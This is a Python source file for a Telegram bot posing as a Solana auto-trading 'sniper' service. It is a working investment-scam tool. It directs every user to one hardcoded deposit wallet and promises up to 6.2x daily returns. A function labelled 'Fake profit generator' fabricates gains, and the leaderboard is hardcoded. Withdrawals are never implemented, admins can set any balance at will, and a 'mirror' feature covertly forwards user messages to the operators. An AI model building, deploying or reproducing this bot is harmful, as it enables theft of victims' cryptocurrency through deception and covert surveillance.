# Saturn Auto Trade (Optimized Version)
# Requirements: pip install pyTelegramBotAPI

import telebot
from telebot import types
import json, os, random, time, datetime
from collections import defaultdict

# =========================
# CONFIG
# =========================
PRIMARY_ADMIN_ID = 6320779357
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
DB_FILE = "saturn_db.json"
DEPOSIT_WALLET = "EXbk9r9P6W1UFAWAr9Mav6rLLqMWEEsVoLysKhBPsfG8"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# =========================
# LOAD / SAVE DB
# =========================
def load_db():
    if not os.path.exists(DB_FILE): return {}
    try:
        with open(DB_FILE, "r") as f: return json.load(f)
    except: return {}

def save_db():
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
    except Exception as e:
        print("DB SAVE ERROR:", e)

db = load_db()
if "__meta__" not in db: db["__meta__"] = {}
meta = db["__meta__"]
meta.setdefault("admins", [str(PRIMARY_ADMIN_ID)])
meta.setdefault("banned", [])
meta.setdefault("sniper_min_balance", 3.0)
meta.setdefault("profit_min", 0.002)
meta.setdefault("profit_max", 0.01)
meta.setdefault("withdraw_min", 0.1)
save_db()

# =========================
# HELPERS
# =========================
def now_utc(): return datetime.datetime.utcnow().strftime("%Y-%m-%d • %I:%M %p UTC")
def is_admin(uid): return str(uid) in meta["admins"]
def is_banned(uid): return str(uid) in meta["banned"]

def get_user(uid):
    uid = str(uid)
    if uid not in db:
        db[uid] = {
            "created_at": now_utc(),
            "withdraw_address": "",
            "address_locked": False,
            "balance": 0.0,
            "total_deposited": 0.0,
            "profit_total": 0.0,
            "sniper_running": False,
            "main_message_id": None,
            "info_message_id": None,
            "last_active": now_utc(),
            "temp": None,
            "verified": True
        }
        save_db()
    else:
        db[uid]["last_active"] = now_utc()
        save_db()
    return db[uid]

# Fake profit generator
def update_fake_profit(user):
    if not user["sniper_running"]: return
    if user["balance"] < meta["sniper_min_balance"]:
        user["sniper_running"] = False
        save_db()
        return
    gain = user["balance"] * random.uniform(meta["profit_min"], meta["profit_max"])
    gain = round(gain, 4)
    user["balance"] += gain
    user["profit_total"] += gain
    save_db()

# =========================
# MAIN PANELS
# =========================
def main_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🚀 Start Saturn Sniper", callback_data="sniper_start"),
        types.InlineKeyboardButton("⛔ Stop Saturn Sniper", callback_data="sniper_stop"),
        types.InlineKeyboardButton("💰 Balance", callback_data="balance"),
        types.InlineKeyboardButton("💼 Deposit", callback_data="deposit"),
        types.InlineKeyboardButton("📊 Stats", callback_data="stats"),
        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    return m

def send_main(chat_id, user):
    txt = (
        "Your Wallet Has Been Successfully Created 🟢\n\n"
        "🪐 Solana Deposit Address:\n"
        f"```{DEPOSIT_WALLET}```\n"
        f"Balance: {user['balance']:.1f} SOL\n\n"
        "💰 (This address will be used by the bot to make profitable trades..)\n\n"
        "Profit Potential (per 24h):\n"
        "✅ 3 SOL Deposit: Earn up to 2x daily\n"
        "✅ 5 SOL Deposit: Earn up to 4.5x daily\n"
        "✅ 10+ SOL Deposit: Earn up to 6.2x daily\n\n"
        "Use the menu buttons below.\n\n"
        "🟢 Promotion Active"
    )
    m = user["main_message_id"]
    try:
        if m:
            bot.edit_message_text(txt, chat_id, m, reply_markup=main_menu(), parse_mode="Markdown")
            return
    except: pass
    msg = bot.send_message(chat_id, txt, reply_markup=main_menu(), parse_mode="Markdown")
    user["main_message_id"] = msg.message_id
    save_db()

def update_info(chat_id, user, text, kb=None, md=True):
    mid = user["info_message_id"]
    mode = "Markdown" if md else None
    try:
        if mid:
            bot.edit_message_text(text, chat_id, mid, reply_markup=kb, parse_mode=mode)
            return
    except: pass
    msg = bot.send_message(chat_id, text, reply_markup=kb, parse_mode=mode)
    user["info_message_id"] = msg.message_id
    save_db()

# =========================
# START
# =========================
@bot.message_handler(commands=["start"])
def start_cmd(msg):
    uid = msg.from_user.id
    if is_banned(uid):
        bot.reply_to(msg, "🚫 You are banned.")
        return
    user = get_user(uid)
    update_fake_profit(user)
    send_main(msg.chat.id, user)
    update_info(msg.chat.id, user, "📋 Use the menu below.")

# =========================
# ADMIN PANEL — MULTI PAGE
# =========================
def admin_panel_page(page):
    kb = types.InlineKeyboardMarkup()

    if page == 1:
        kb.add(
            types.InlineKeyboardButton("🟢 Mirror ON", callback_data="admin:mirror_on"),
            types.InlineKeyboardButton("🔴 Mirror OFF", callback_data="admin:mirror_off"),
            types.InlineKeyboardButton("📡 Logstream ON", callback_data="admin:log_on"),
            types.InlineKeyboardButton("📡 Logstream OFF", callback_data="admin:log_off"),
            types.InlineKeyboardButton("⚙️ Set Sniper Min Balance", callback_data="admin:set_minbal"),
            types.InlineKeyboardButton("➡️ Next", callback_data="admin:page2")
        )
        return kb

    if page == 2:
        kb.add(
            types.InlineKeyboardButton("🚫 Ban User", callback_data="admin:ban"),
            types.InlineKeyboardButton("🟩 Unban User", callback_data="admin:unban"),
            types.InlineKeyboardButton("🔍 View User", callback_data="admin:view"),
            types.InlineKeyboardButton("♻️ Reset User", callback_data="admin:reset"),
            types.InlineKeyboardButton("📜 List Users", callback_data="admin:listusers"),
            types.InlineKeyboardButton("📝 Add Note", callback_data="admin:note"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="admin:page1"),
            types.InlineKeyboardButton("➡️ Next", callback_data="admin:page3")
        )
        return kb

    if page == 3:
        kb.add(
            types.InlineKeyboardButton("➕ Add Balance", callback_data="admin:add_bal"),
            types.InlineKeyboardButton("📌 Set Balance", callback_data="admin:set_bal"),
            types.InlineKeyboardButton("💹 Add Profit", callback_data="admin:add_profit"),
            types.InlineKeyboardButton("📈 Set Profit", callback_data="admin:set_profit"),
            types.InlineKeyboardButton("💼 Set Deposit", callback_data="admin:set_deposit"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="admin:page2"),
            types.InlineKeyboardButton("➡️ Next", callback_data="admin:page4")
        )
        return kb

    if page == 4:
        kb.add(
            types.InlineKeyboardButton("📤 DM User", callback_data="admin:dm"),
            types.InlineKeyboardButton("💬 Reply", callback_data="admin:reply"),
            types.InlineKeyboardButton("📣 Broadcast", callback_data="admin:broadcast"),
            types.InlineKeyboardButton("📎 Media Broadcast", callback_data="admin:broadcast_media"),
            types.InlineKeyboardButton("👥 Group Broadcast", callback_data="admin:broadcast_group"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="admin:page3"),
            types.InlineKeyboardButton("➡️ Next", callback_data="admin:page5")
        )
        return kb

    if page == 5:
        kb.add(
            types.InlineKeyboardButton("📊 Analytics", callback_data="admin:analytics"),
            types.InlineKeyboardButton("🧹 Fix DB", callback_data="admin:fixdb"),
            types.InlineKeyboardButton("💾 Backup DB", callback_data="admin:backup"),
            types.InlineKeyboardButton("📥 DB Dump", callback_data="admin:dump"),
            types.InlineKeyboardButton("🪓 Prune Users", callback_data="admin:prune"),
            types.InlineKeyboardButton("🔄 Reload DB", callback_data="admin:reload"),
            types.InlineKeyboardButton("♻️ Reboot Bot", callback_data="admin:reboot"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="admin:page4"),
            types.InlineKeyboardButton("➡️ Next", callback_data="admin:page6")
        )
        return kb

    if page == 6:
        kb.add(
            types.InlineKeyboardButton("➕ Add Admin", callback_data="admin:addadmin"),
            types.InlineKeyboardButton("➖ Remove Admin", callback_data="admin:removeadmin"),
            types.InlineKeyboardButton("🛡 List Admins", callback_data="admin:listadmins"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="admin:page5")
        )
        return kb

# =========================
# /admin ENTRY
# =========================
@bot.message_handler(commands=["admin"])
def admin_cmd(msg):
    if not is_admin(msg.from_user.id):
        bot.reply_to(msg, "You are not admin.")
        return

    bot.send_message(
        msg.chat.id,
        "🛡 *Admin Panel — Page 1*",
        parse_mode="Markdown",
        reply_markup=admin_panel_page(1)
    )

# =========================
# TEMP STORAGE FOR ADMIN INPUT
# =========================
ADMIN_TEMP = {}

def ask_admin(call, prompt, action_key, extra=None):
    msg = bot.send_message(call.message.chat.id, prompt)
    ADMIN_TEMP[call.from_user.id] = (action_key, extra)
    bot.register_next_step_handler(msg, handle_admin_input)

# =========================
# HANDLE ADMIN TEXT INPUT
# =========================
@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_TEMP)
def handle_admin_input(msg):
    admin_id = msg.from_user.id
    action, extra = ADMIN_TEMP.pop(admin_id)

    if not is_admin(admin_id):
        return

    text = msg.text.strip()

    # --- Set sniper minimum balance ---
    if action == "set_minbal":
        try:
            meta["sniper_min_balance"] = float(text)
            save_db()
            bot.reply_to(msg, f"✅ Sniper minimum updated to {text} SOL.")
        except:
            bot.reply_to(msg, "❌ Invalid number.")
        return

    # --- User operations ---
    if action in ["ban", "unban", "view", "reset", "note", "dm", "reply"]:
        try:
            target = int(text)
        except:
            bot.reply_to(msg, "User ID must be a number.")
            return

        user = get_user(target)

        if action == "ban":
            meta["banned"].append(str(target))
            save_db()
            bot.reply_to(msg, "🚫 User banned.")
            return

        if action == "unban":
            if str(target) in meta["banned"]:
                meta["banned"].remove(str(target))
                save_db()
            bot.reply_to(msg, "🟩 User unbanned.")
            return

        if action == "view":
            bot.reply_to(msg, json.dumps(user, indent=2))
            return

        if action == "reset":
            created = user["created_at"]
            db[str(target)] = {
                "created_at": created,
                "withdraw_address": "",
                "address_locked": False,
                "balance": 0.0,
                "total_deposited": 0.0,
                "profit_total": 0.0,
                "sniper_running": False,
                "main_message_id": None,
                "info_message_id": None,
                "last_active": now_utc(),
                "temp": None,
                "verified": True
            }
            save_db()
            bot.reply_to(msg, "♻️ User reset.")
            return

        if action == "note":
            user["admin_note"] = text
            save_db()
            bot.reply_to(msg, "📝 Note added.")
            return

# =========================
# ADMIN CALLBACK HANDLER
# =========================
@bot.callback_query_handler(func=lambda c: c.data.startswith("admin:"))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Not admin.")
        return

    action = call.data.split("admin:")[1]

    # --------------------
    # PAGE NAVIGATION
    # --------------------
    if action.startswith("page"):
        pg = int(action.replace("page", ""))
        bot.edit_message_text(
            f"🛡 *Admin Panel — Page {pg}*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=admin_panel_page(pg)
        )
        return

    # --------------------
    # SIMPLE SWITCHES
    # --------------------
    if action == "mirror_on":
        meta["mirror"] = True
        save_db()
        bot.answer_callback_query(call.id, "Mirror ON")
        return

    if action == "mirror_off":
        meta["mirror"] = False
        save_db()
        bot.answer_callback_query(call.id, "Mirror OFF")
        return

    if action == "log_on":
        meta["log"] = True
        save_db()
        bot.answer_callback_query(call.id, "Logstream ON")
        return

    if action == "log_off":
        meta["log"] = False
        save_db()
        bot.answer_callback_query(call.id, "Logstream OFF")
        return

    # --------------------
    # PROMPT INPUT REQUESTS
    # --------------------
    if action in ["set_minbal", "ban", "unban", "view", "reset", "note"]:
        ask_admin(call, f"Enter value for: {action}", action)
        return

    # --------------------
    # LIST USERS
    # --------------------
    if action == "listusers":
        users = [u for u in db if u != "__meta__"]
        bot.send_message(call.message.chat.id, "Users:\n" + "\n".join(users))
        return

    # --------------------
    # ANALYTICS
    # --------------------
    if action == "analytics":
        total = len([u for u in db if u != "__meta__"])
        sniper_on = len([u for u in db if u != "__meta__" and db[u]["sniper_running"]])
        bal = sum(db[u]["balance"] for u in db if u != "__meta__")
        prof = sum(db[u]["profit_total"] for u in db if u != "__meta__")
        bot.send_message(
            call.message.chat.id,
            f"📊 Analytics\nUsers: {total}\nSnipers: {sniper_on}\nBalance: {bal:.2f}\nProfit: {prof:.2f}"
        )
        return

    # --------------------
    # FIX DB
    # --------------------
    if action == "fixdb":
        removed = 0
        for k in list(db.keys()):
            if k != "__meta__" and not isinstance(db[k], dict):
                del db[k]
                removed += 1
        save_db()
        bot.send_message(call.message.chat.id, f"DB fixed. Removed {removed} bad entries.")
        return

    # --------------------
    # BACKUP
    # --------------------
    if action == "backup":
        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        fn = f"backup_{ts}.json"
        with open(fn, "w") as f: json.dump(db, f, indent=2)
        with open(fn, "rb") as f: bot.send_document(call.message.chat.id, f)
        return

    # --------------------
    # DUMP
    # --------------------
    if action == "dump":
        with open(DB_FILE, "rb") as f:
            bot.send_document(call.message.chat.id, f)
        return

    # --------------------
    # PRUNE
    # --------------------
    if action == "prune":
        removed = 0
        for k in list(db.keys()):
            if k != "__meta__" and db[k]["balance"] == 0 and db[k]["total_deposited"] == 0:
                del db[k]
                removed += 1
        save_db()
        bot.send_message(call.message.chat.id, f"Pruned {removed} users.")
        return

    # --------------------
    # RELOAD (FIXED VERSION)
    # --------------------
    if action == "reload":
        global db, meta
        db = load_db()
        meta = db["__meta__"]
        bot.send_message(call.message.chat.id, "DB Reloaded.")
        return

    # --------------------
    # REBOOT
    # --------------------
    if action == "reboot":
        bot.send_message(call.message.chat.id, "Rebooting...")
        os._exit(0)

# =========================
# USER CALLBACK HANDLER
# =========================
@bot.callback_query_handler(func=lambda c: not c.data.startswith("admin:"))
def user_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "🚫 You are banned.")
        return

    user = get_user(uid)
    chat_id = call.message.chat.id
    data = call.data

    update_fake_profit(user)

    if data == "sniper_start":
        min_req = meta["sniper_min_balance"]
        if user["balance"] < min_req:
            update_info(chat_id, user, f"❌ Need *{min_req} SOL* to start sniper.", None, True)
            return
        user["sniper_running"] = True
        save_db()
        update_info(chat_id, user, "🚀 Sniper Activated!")
        return

    if data == "sniper_stop":
        user["sniper_running"] = False
        save_db()
        update_info(chat_id, user, "⛔ Sniper Stopped.")
        return

    if data == "balance":
        update_info(chat_id, user,
            f"💰 Balance: {user['balance']:.2f}\nProfit: {user['profit_total']:.2f}\nSniper: {user['sniper_running']}")
        return

    if data == "stats":
        dep = user["total_deposited"]
        bal = user["balance"]
        prof = user["profit_total"]
        roi = (prof / dep * 100) if dep > 0 else 0
        update_info(chat_id, user,
            f"📊 Stats:\nDeposited: {dep}\nBalance: {bal}\nProfit: {prof}\nROI: {roi:.2f}%")
        return

    if data == "leaderboard":
        update_info(chat_id, user,
            "🏆 Leaderboard:\n🥇 User1 +15.4\n🥈 User2 +12.8\n🥉 User3 +9.2")
        return

    if data == "deposit":
        update_info(chat_id, user,
            f"Deposit SOL:\n```{DEPOSIT_WALLET}```", None, True)
        return

    if data == "settings":
        addr = user["withdraw_address"] or "Not Set"
        locked = "🔒" if user["address_locked"] else "🔓"
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✏️ Change Address", callback_data="change_addr"))
        kb.add(types.InlineKeyboardButton("🔒 Toggle Lock", callback_data="toggle_lock"))
        update_info(chat_id, user, f"Address: `{addr}` {locked}", kb, True)
        return

    if data == "toggle_lock":
        user["address_locked"] = not user["address_locked"]
        save_db()
        update_info(chat_id, user, f"Locked: {user['address_locked']}")
        return

    if data == "change_addr":
        if user["address_locked"]:
            update_info(chat_id, user, "❌ Address locked.")
            return
        msg = bot.send_message(chat_id, "Send new address:")
        user["temp"] = "new_addr"
        save_db()
        bot.register_next_step_handler(msg, address_input_handler)
        return

# =========================
# ADDRESS INPUT HANDLER
# =========================
def address_input_handler(msg):
    uid = msg.from_user.id
    user = get_user(uid)

    if user.get("temp") != "new_addr":
        return

    new = msg.text.strip()
    user["temp"] = None

    if not (30 <= len(new) <= 60):
        bot.send_message(msg.chat.id, "❌ Invalid address.")
        return

    user["withdraw_address"] = new
    user["last_address_edit"] = now_utc()
    save_db()

    bot.send_message(msg.chat.id, f"✅ Address Updated:\n`{new}`", parse_mode="Markdown")

# =========================
# MIRROR LISTENER
# =========================
def mirror_listener(messages):
    if not messages: return
    for m in messages:
        uid = m.from_user.id if m.from_user else None
        if not uid: continue
        if is_admin(uid): continue
        if meta.get("mirror"):
            for a in meta["admins"]:
                bot.send_message(int(a), f"[MIRROR] {uid}: {m.text}")

bot.set_update_listener(mirror_listener)

# =========================
# POLLING LOOP
# =========================
if __name__ == "__main__":
    print("Saturn Auto Trade Bot Running...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print("Polling error:", e)
            time.sleep(3)
